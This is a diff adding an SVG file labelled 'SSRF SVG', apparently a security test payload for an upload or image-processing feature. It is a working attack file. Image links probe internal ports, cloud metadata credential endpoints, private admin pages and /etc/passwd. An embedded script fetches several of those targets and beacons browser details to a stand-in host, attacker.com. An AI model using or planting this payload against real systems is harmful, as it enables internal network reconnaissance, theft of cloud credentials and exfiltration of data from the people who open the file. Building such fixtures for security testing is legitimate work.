@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+  <!-- Multiple SSRF vectors -->
+  
+  <!-- Internal services enumeration -->
+  <image xlink:href="http://127.0.0.1:22" />
+  <image xlink:href="http://127.0.0.1:80" />
+  <image xlink:href="http://127.0.0.1:443" />
+  <image xlink:href="http://127.0.0.1:3306" />
+  <image xlink:href="http://127.0.0.1:5432" />
+  <image xlink:href="http://127.0.0.1:6379" />
+  <image xlink:href="http://127.0.0.1:8080" />
+  <image xlink:href="http://127.0.0.1:9090" />
+  
+  <!-- Cloud metadata services -->
+  <image xlink:href="http://169.254.169.254/latest/meta-data/" />
+  <image xlink:href="http://169.254.169.254/latest/meta-data/instance-id" />
+  <image xlink:href="http://169.254.169.254/latest/meta-data/security-credentials/" />
+  <image xlink:href="http://metadata.google.internal/computeMetadata/v1/" />
+  
+  <!-- Internal network scanning -->
+  <image xlink:href="http://192.168.1.1/admin" />
+  <image xlink:href="http://10.0.0.1/config" />
+  <image xlink:href="http://172.16.0.1/status" />
+  
+  <!-- File system access attempts -->
+  <image xlink:href="file:///etc/passwd" />
+  <image xlink:href="file:///etc/hosts" />
+  <image xlink:href="file:///proc/version" />
+  
+  <!-- Application-specific endpoints -->
+  <image xlink:href="http://localhost:5000/api/admin" />
+  <image xlink:href="http://localhost:5000/api/users" />
+  <image xlink:href="http://localhost:5000/.env" />
+  <image xlink:href="http://localhost:5000/config.json" />
+  
+  <!-- XSS + SSRF combination -->
+  <script><![CDATA[
+    // Advanced SSRF with data exfiltration
+    const ssrfTargets = [
+      'http://127.0.0.1:22',
+      'http://127.0.0.1:3306', 
+      'http://169.254.169.254/latest/meta-data/',
+      'http://localhost:5000/api/admin',
+      'file:///etc/passwd'
+    ];
+    
+    function performSSRF() {
+      ssrfTargets.forEach((target, index) => {
+        setTimeout(() => {
+          try {
+            fetch(target, {mode: 'no-cors'})
+              .then(() => console.log('SSRF success:', target))
+              .catch(() => console.log('SSRF blocked:', target));
+          } catch(e) {
+            console.log('SSRF error:', target, e);
+          }
+        }, index * 100);
+      });
+    }
+    
+    // Execute SSRF attempts
+    performSSRF();
+    
+    // Exfiltrate results
+    setTimeout(() => {
+      const results = {
+        ssrfAttempts: ssrfTargets.length,
+        userAgent: navigator.userAgent,
+        origin: window.location.origin,
+        timestamp: Date.now()
+      };
+      
+      // Send to attacker server
+      const img = new Image();
+      img.src = 'https://attacker.com/ssrf-results?data=' + btoa(JSON.stringify(results));
+    }, 2000);
+  ]]></script>
+  
+  <!-- Visual element -->
+  <rect x="10" y="10" width="180" height="180" fill="orange" stroke="red" stroke-width="2"/>
+  <text x="100" y="100" text-anchor="middle" fill="black" font-size="16">SSRF SVG</text>
+</svg>
